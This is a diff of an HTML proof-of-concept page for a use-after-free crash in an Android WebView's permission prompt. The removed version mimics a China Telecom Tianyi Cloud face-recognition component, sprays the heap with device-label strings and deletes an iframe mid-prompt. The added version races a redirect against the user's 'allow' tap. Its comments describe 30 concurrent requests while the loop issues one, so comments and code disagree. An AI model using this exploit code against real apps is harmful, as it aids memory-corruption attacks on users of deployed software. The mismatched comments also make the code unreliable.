@@ -3,92 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>电信天翼云刷脸场景精准模拟器</title>
+    <title>WebView UAF 稳定性压测 (手动版)</title>
     <style>
-        body { font-family: -apple-system, sans-serif; text-align: center; padding: 30px 20px; background: #f4f5f6; }
-        .card { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
-        .btn { padding: 16px; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 12px; cursor: pointer; width: 100%; margin-bottom: 15px; display: block; }
-        .btn-blue { background: #007aff; }
-        .btn-orange { background: #ff9500; }
-        .console { text-align: left; background: #222; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 13px; min-height: 100px; }
-        .step { text-align: left; font-size: 14px; line-height: 1.6; background: #fff9e6; padding: 15px; border-radius: 8px; margin-top: 15px; border-left: 5px solid #ff9500; }
+        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; background: #fafafa; color: #333; }
+        .card { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.08); }
+        .btn { padding: 16px 32px; font-size: 18px; font-weight: bold; color: white; background: #007aff; border: none; border-radius: 8px; cursor: pointer; transition: background 0.2s; width: 100%; }
+        .btn:hover { background: #0056b3; }
+        .steps { text-align: left; margin-top: 25px; background: #f5f5f7; padding: 15px; border-radius: 8px; font-size: 14px; line-height: 1.6; }
+        .warning { color: #ff3b30; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>🛸 天翼云人脸识别时序模拟</h2>
-    <p style="color: #666; font-size: 14px;">还原真实 H5 刷脸组件生命周期断层</p>
-
-    <button class="btn btn-blue" id="btn1" onclick="unlockLabels()">1. 第一步：解锁相机真实标签</button>
-    <button class="btn btn-orange" id="btn2" onclick="startFaceIdSimulation()" disabled>2. 第二步：模拟进入刷脸页面</button>
-
-    <div class="console" id="logBox">等待操作...</div>
-
-    <div class="step">
-        <strong>💡 现网闭环复现步骤：</strong><br>
-        1. 点击<strong>第一步</strong>，在系统弹窗中允许权限。确保日志显示“标签已解锁”。<br>
-        2. 点击<strong>第二步</strong>，网页会模拟天翼云加载刷脸组件，此时 App <strong>一定会再次弹出权限申请框</strong>，Java 层日志开始打印。<br>
-        3. <span style="color:red; font-weight:bold;">盯紧下方的绿色日志盒</span>，当看到提示 <span style="color:#00ff00;">"⚠️ 后台已强拆刷脸组件！"</span> 时……<br>
-        4. **这时候，再去点击屏幕上残留的系统权限弹窗（允许）**。App 将瞬间崩溃，精准撞击 C++ 层的指针！
+    <div class="card">
+        <h2>🛸 WebView 内存漏洞对撞机</h2>
+        <p>本测试专门用于复现 UAF 闪退</p>
+        
+        <button class="btn" onclick="triggerManualAttack()">1. 点击开始测试</button>
+        
+        <div class="steps">
+            <strong>🎯 完美复现操作指南：</strong><br>
+            1. 点击上方蓝色按钮。<br>
+            2. 屏幕上会弹出 WebView 原生的“允许拍摄视频和录制音频”弹窗。<br>
+            3. <span class="warning">关键点：请用你最快的单身手速，立刻点击“允许”或“仅在使用中允许”。</span><br>
+            4. 观察 App 是否在点击的瞬间轰然闪退。
+        </div>
     </div>
-</div>
 
-<script>
-    let labelsUnlocked = false;
-
-    function printLog(msg) {
-        document.getElementById('logBox').innerHTML = msg;
-    }
-
-    // 1. 先满足隐私策略，让底层多媒体填坑字符串生效
-    function unlockLabels() {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                stream.getTracks().forEach(t => t.stop());
-                navigator.mediaDevices.enumerateDevices().then(devices => {
-                    labelsUnlocked = true;
-                    document.getElementById('btn2').disabled = false;
-                    document.getElementById('btn1').disabled = true;
-                    printLog("✅ 真实标签已解锁！堆污染源就绪。");
+    <script>
+        function triggerManualAttack() {
+            console.log("开始向内核队列注入 30 个并发权限请求...");
+            
+            // 核心伏笔：一口气往内核的 PermissionRequestManager 里塞入 30 个任务
+            // 此时底层会生成 30 个 MediaAccessPermissionRequest 对象
+            for (let i = 0; i < 1; i++) {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                .then((stream) => {
+                    // 核心时序：当你手动点击“允许”的瞬间，第 1 个排队成功的请求会立刻触发此回调
+                    // 并在零点几毫秒内执行跨域重定向，强行让内核对当前页面执行 Tear Down（大卸八块）
+                    // 此时，后面剩下的 29 个请求还在内核管道里排队执行 OnAccept() 流程
+                    // 它们一睁眼，正好撞上老 Origin 被释放、摄像头字符串填坑的毁灭现场！
+                    window.location.href = "https://httpbin.org/uuid?nocache=" + Date.now();
+                })
+                .catch(err => {
+                    console.log("请求被拒绝或取消");
                 });
-            }).catch(e => printLog("❌ 授权失败，请允许权限"));
-    }
-
-    // 2. 核心：模拟天翼云 H5 刷脸组件的单次生命周期
-    function startFaceIdSimulation() {
-        printLog("🎬 模拟开始：正在加载 H5 刷脸组件...");
-
-        // 启动背景多媒体堆充填（源源不断生成带有 camera2 的字符串洗刷堆内存）
-        setInterval(() => {
-            navigator.mediaDevices.enumerateDevices().then(devices => {
-                let dummy = devices.map(d => d.label).join(",");
-            }).catch(()=>{});
-        }, 1);
-
-        // 动态创建天翼云刷脸沙箱 Iframe
-        let faceIframe = document.createElement('iframe');
-        faceIframe.allow = "camera; microphone";
-        faceIframe.srcdoc = `
-            <script>
-                // 刷脸页面一加载，立刻申请摄像头
-                navigator.mediaDevices.getUserMedia({ video: true }).catch(e=>{});
-            <\/script>
-        `;
-        document.body.appendChild(faceIframe);
-
-        // ⏳ 给 IPC 留出绝对充足的时间（1.5秒），保证弹窗绝对已经到了 Java 层并显示在屏幕上
-        setTimeout(() => {
-            
-            // 💥【现网绝杀点】：用户还没来得及点击允许，或者刷脸组件判定超时/取消
-            // 网页无情强拆 Iframe，C++ 层的 AwPermissionRequest 被内核单方面 delete
-            faceIframe.remove();
-            
-            printLog("<span style='color:#ff3b30; font-weight:bold;'>⚠️ 后台已强拆刷脸组件（C++ 对象已死）！<br>🔥 快！现在立刻去点击屏幕上的允许按钮！</span>");
-            
-        }, 1500); 
-    }
-</script>
-
+            }
+        }
+    </script>
 </body>
 </html>
